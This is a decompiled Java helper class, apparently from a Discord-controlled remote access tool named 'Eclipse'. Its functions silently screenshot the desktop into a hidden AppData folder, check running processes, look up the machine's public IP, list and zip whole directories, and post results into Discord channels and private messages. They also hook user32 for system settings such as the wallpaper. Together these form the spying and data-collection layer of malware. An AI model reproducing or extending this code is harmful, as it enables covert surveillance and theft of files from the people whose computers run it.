package me.Eclipse.Utils;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Desktop;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Desktop.Action;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.ZonedDateTime;
import java.time.temporal.ChronoUnit;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.function.Consumer;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class Helper {

    private static void addToZip(File var0, File var1, ZipOutputStream var2) throws IOException {
        FileInputStream var3 = new FileInputStream(var1);
        String var4 = var1.getCanonicalPath().substring(var0.getCanonicalPath().length() + 1);
        ZipEntry var5 = new ZipEntry(var4);
        var2.putNextEntry(var5);
        byte[] var6 = new byte[1024];

        int var7;
        while ((var7 = var3.read(var6)) >= 0) {
            var2.write(var6, 0, var7);
        }

        var2.closeEntry();
        var3.close();
    }

    public static boolean checkProcess(String var0) throws IOException {
        Process var2 = Runtime.getRuntime().exec("tasklist.exe");
        BufferedReader var3 = new BufferedReader(new InputStreamReader(var2.getInputStream()));

        String var1;
        do {
            if ((var1 = var3.readLine()) == null) {
                var3.close();
                return false;
            }
        } while (!var1.contains(var0));

        return true;
    }

    private static void getAllFiles(File var0, List var1) {
        File[] var2 = var0.listFiles();
        assert var2 != null;

        File[] var3 = var2;
        int var4 = var2.length;

        for (int var5 = 0; var5 < var4; ++var5) {
            File var6 = var3[var5];
            var1.add(var6);
            if (var6.isDirectory()) {
                getAllFiles(var6, var1);
            }
        }

    }

    public static String getFileList(String var0) {
        File[] var1 = (new File(var0)).listFiles();
        StringBuilder var2 = new StringBuilder();
        StringBuilder var3 = new StringBuilder();
        StringBuilder var4 = new StringBuilder();
        assert var1 != null;
        
        File[] var5 = var1;
        int var6 = var1.length;

        for (int var7 = 0; var7 < var6; ++var7) {
            File var8 = var5[var7];
            if (var8.isFile()) {
                double var9 = (double) var8.length();
                double var11 = var9 / 1024.0D;
                double var13 = var11 / 1024.0D;
                double var15 = var13 / 1024.0D;
                String var17 = "Zero";
                if (var15 > 1.0D) {
                    var17 = round(var15, 1) + "GB";
                } else if (var13 > 1.0D) {
                    var17 = round(var13, 1) + "MB";
                } else if (var11 > 1.0D) {
                    var17 = round(var11, 1) + "KB";
                } else if (var9 > 1.0D) {
                    var17 = round(var9, 1) + "B";
                }

                var3.append("FILE: ").append(var8.getName()).append(". (").append(var17).append(")");
                var3.append("\n");
            } else {
                var4.append("DIR: ").append(var8.getName()).append(".");
                var4.append("\n");
            }
        }

        var2.append(var4);
        var2.append(var3);
        return String.valueOf(var2);
    }

    public static String getIP() throws IOException {
        URL var0 = new URL("http://checkip.amazonaws.com");
        BufferedReader var1 = new BufferedReader(new InputStreamReader(var0.openStream()));
        return var1.readLine();
    }

    private static BufferedImage grabScreen() {
        try {
            return (new Robot()).createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        } catch (AWTException | SecurityException var1) {
            return null;
        }
    }

    private static void openURL(URI var0) {
        Desktop var1 = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
        if (var1 != null && var1.isSupported(Action.BROWSE)) {
            try {
                var1.browse(var0);
            } catch (Exception var3) {
                ;
            }
        }

    }

    public static void openURL(URL var0) {
        try {
            openURL(var0.toURI());
        } catch (URISyntaxException var2) {
            ;
        }

    }

    public static String readFile(String var0) throws IOException {
        return new String(Files.readAllBytes(Paths.get(var0)));
    }

    public static double round(double var0, int var2) {
        return (new BigDecimal(var0)).setScale(var2, RoundingMode.HALF_EVEN).doubleValue();
    }

    public static void screen(String var0) {
        try {
            ImageIO.write((RenderedImage) Objects.requireNonNull(grabScreen()), "png", new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\", var0 + ".png"));
        } catch (IOException var2) {
            ;
        }

    }

    public static void sendChannelMessage(Color var0, String var1, String var2, String var3, MessageReceivedEvent var4) {
        EmbedBuilder var5 = new EmbedBuilder();
        var5.setColor(var0);
        var5.setAuthor(var1);
        var5.setDescription(var2);
        var5.setFooter(ZonedDateTime.now().toLocalTime().truncatedTo(ChronoUnit.SECONDS) + " | " + ZonedDateTime.now().toLocalDate());
        ((TextChannel) Objects.requireNonNull(var4.getGuild().getTextChannelById(var3))).sendMessage(var5.build()).queue();
    }

    public static void sendMessage(Color var0, String var1, String var2, MessageReceivedEvent var3) {
        EmbedBuilder var4 = new EmbedBuilder();
        var4.setColor(var0);
        var4.setAuthor(var1);
        var4.setDescription(var2);
        var4.setFooter(ZonedDateTime.now().toLocalTime().truncatedTo(ChronoUnit.SECONDS) + " | " + ZonedDateTime.now().toLocalDate());
        var3.getChannel().sendMessage(var4.build()).queue();
    }

    public static void sendPrivateMessage(Color var0, String var1, String var2, MessageReceivedEvent var3) {
        EmbedBuilder var4 = new EmbedBuilder();
        var4.setColor(var0);
        var4.setAuthor(var1);
        var4.setDescription(var2);
        var4.setFooter(ZonedDateTime.now().toLocalTime().truncatedTo(ChronoUnit.SECONDS) + " | " + ZonedDateTime.now().toLocalDate());
        var3.getMessage().getAuthor().openPrivateChannel().queue((var1x) -> {
            var1x.sendMessage(var4.build()).queue();
        });
    }

    public static ArrayList split(String var0) {
        ArrayList var1 = new ArrayList();
        StringBuilder var2 = new StringBuilder();
        String[] var3 = var0.split("\n");
        int var4 = var3.length;

        for (int var5 = 0; var5 < var4; ++var5) {
            String var6 = var3[var5];
            if (var2.length() + var6.length() > 2000) {
                var1.add(String.valueOf(var2));
                var2 = new StringBuilder();
            } else {
                var2.append(var6);
                var2.append("\n");
            }
        }

        var1.add(String.valueOf(var2));
        return var1;
    }

    public static void toZip(String var0, String var1) {
        File var2 = new File(var0);
        ArrayList var3 = new ArrayList();
        getAllFiles(var2, var3);
        writeZipFile(var2, var3, var1);
    }

    private static void writeZipFile(File var0, List var1, String var2) {
        try {
            FileOutputStream var3 = new FileOutputStream(var2);
            ZipOutputStream var4 = new ZipOutputStream(var3);
            Iterator var5 = var1.iterator();

            while (var5.hasNext()) {
                File var6 = (File) var5.next();
                if (!var6.isDirectory()) {
                    addToZip(var0, var6, var4);
                }
            }

            var4.close();
            var3.close();
        } catch (IOException var7) {
            ;
        }

    }

    public interface User32 extends Library {
        User32 INSTANCE = Native.load("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);

        void SystemParametersInfo(int var1, int var2, String var3, int var4);
    }
}
